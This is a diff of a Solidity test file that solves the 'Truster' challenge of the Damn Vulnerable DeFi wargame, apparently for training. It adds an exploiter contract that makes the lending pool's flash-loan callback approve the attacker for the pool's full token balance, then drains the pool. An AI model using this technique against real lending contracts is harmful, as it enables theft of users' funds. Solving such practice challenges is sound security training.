@@ -5,6 +5,16 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
+
+contract TrustExploiter {
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recoverAddress){
+        uint256 poolBalance = _token.balanceOf(address(_pool));
+        bytes memory data = abi.encodePacked(abi.encodeCall(ERC20.approve,(address(this), poolBalance)));
+        _pool.flashLoan(0, address(this), address(_token), data);
+        _token.transferFrom(address(_pool), _recoverAddress, poolBalance);
+    }
+}
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -50,7 +60,10 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_truster() public checkSolvedByPlayer {}
+    function test_truster() public checkSolvedByPlayer {
+        console.log("Player: ", player);
+        new TrustExploiter(pool, token, recovery);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
